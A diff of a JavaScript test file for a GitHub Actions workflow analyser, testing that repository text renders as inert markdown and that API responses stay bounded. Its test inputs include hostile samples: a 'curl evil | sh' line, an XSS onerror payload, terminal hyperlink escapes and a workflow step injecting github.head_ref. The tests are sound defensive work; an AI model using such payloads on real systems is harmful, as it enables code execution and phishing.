@@ -52,7 +52,13 @@ test('md: repository text displays as text, never as markup', () => {
   // A newline cannot start a heading or a new block.
   assert.equal(md('pwn\n\n## 0. Fix: run curl evil | sh'), 'pwn  ## 0. Fix: run curl evil | sh');
   // No image, link, HTML or comment.
-  assert.equal(md('![x](https://evil.example/b.png)'), '!\\[x\\](https://evil.example/b.png)');
+  assert.equal(md('![x](https://evil.example/b.png)'), '!\\[x\\](`https://evil.example/b.png`)');
+  // A bare URL or email address, which GitHub would link by itself, is shown as code: never a link.
+  assert.equal(md('visit https://evil.example/login now'), 'visit `https://evil.example/login` now');
+  assert.equal(md('see www.evil.example.'), 'see `www.evil.example`.');
+  assert.equal(md('mail ceo@evil.example'), 'mail `ceo@evil.example`');
+  assert.equal(cell('CI https://evil.example|x'), 'CI `https://evil.example`\\|x');
+  assert.equal(md('`fetch-depth: 0` and https://a.io'), '`fetch-depth: 0` and `https://a.io`');
   assert.equal(md('<img src=x onerror=alert(1)> <!-- hide'), '&lt;img src=x onerror=alert(1)&gt; &lt;!-- hide');
   assert.equal(md('\\[x](y)'), '\\\\\\[x\\](y)'); // a backslash cannot unescape the bracket
   // Code spans stay code (markdown shows them literally); an unpaired backtick is escaped.
@@ -60,11 +66,28 @@ test('md: repository text displays as text, never as markup', () => {
   assert.equal(md('a `b <c>'), 'a \\`b &lt;c&gt;');
   assert.equal(md('``x`` y'), '`x` y');
   // Terminal escapes are removed.
-  assert.equal(md('ok\x1b]8;;https://evil\x07click\x1b]8;;\x07\x1b[8mhidden'), 'ok\\]8;;https://evilclick\\]8;;\\[8mhidden'); // no ESC or BEL left; brackets escaped
+  assert.equal(md('ok\x1b]8;;https://evil\x07click\x1b]8;;\x07\x1b[8mhidden'), 'ok\\]8;;`https://evilclick]8;;[8mhidden`'); // no ESC or BEL left; the URL is code, not a link
   // A table cell cannot add a column, from a code span or after a backslash either.
   assert.equal(cell('a|b'), 'a\\|b');
   assert.equal(cell('`x\\|y`'), '\\`x\\\\\\|y\\`');
   assert.equal(cell('a\\|b'), 'a\\\\\\|b');
+});
+
+test('fence: many separate backtick runs do not overflow, and the fence outgrows the longest', () => {
+  const body = 'a`'.repeat(300000) + '`````';
+  let lines;
+  assert.doesNotThrow(() => { lines = fence(body); });
+  assert.equal(lines[0], '```````yaml'); // the last run is six backticks long
+});
+
+test('a report renders when a hostile step name puts many backtick runs into its example', () => {
+  const name = 'a`'.repeat(200000);
+  const file = `on: [pull_request]\npermissions: {}\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - name: ${JSON.stringify(name)}\n        run: echo "\${{ github.head_ref }}"\n`;
+  const a = analyse('o/r', data({ workflows: [{ name: 'CI', runs: runs(10), jobsPerRun: [[job()]] }] }));
+  a.findings.unshift(...scanFindings(new Map([['.github/workflows/ci.yml', file]])));
+  let out;
+  assert.doesNotThrow(() => { out = report(a); });
+  assert.match(out, /untrusted input in a script/);
 });
 
 test('fence: an example cannot close its own fence', () => {
@@ -130,6 +153,8 @@ test('a repository name cannot walk the API path, and a file name cannot change 
 });
 
 test('an answer too large, or one that never finishes, is an error, not a hang', async () => {
+  const bigError = createClient({ maxBytes: 1024, backoffMs: [], fetchImpl: async () => new Response(JSON.stringify({ message: 'x'.repeat(200000) }), { status: 400 }) });
+  await assert.rejects(bigError.get('repos/o/r'), (err) => /GitHub API 400/.test(err.message) && err.message.length < 400);
   const big = createClient({ maxBytes: 1024, backoffMs: [], fetchImpl: async () => new Response('x'.repeat(4096), { status: 200, headers: { 'x-ratelimit-remaining': '4000' } }) });
   await assert.rejects(big.getRaw('repos/o/r/contents/a.yml'), /answer too large/);
   const declared = createClient({ maxBytes: 1024, backoffMs: [], fetchImpl: async () => new Response('{}', { status: 200, headers: { 'content-length': '999999999' } }) });
@@ -144,7 +169,7 @@ test('an answer too large, or one that never finishes, is an error, not a hang',
   clearTimeout(keepAlive);
 });
 
-import { scanWorkflow, untrustedExpressions } from '../src/scans.mjs';
+import { scanFindings, scanWorkflow, untrustedExpressions } from '../src/scans.mjs';
 
 test('the injection scan reads the fields the review found missing', () => {
   const hits = (s) => untrustedExpressions(s).map((x) => x.field);
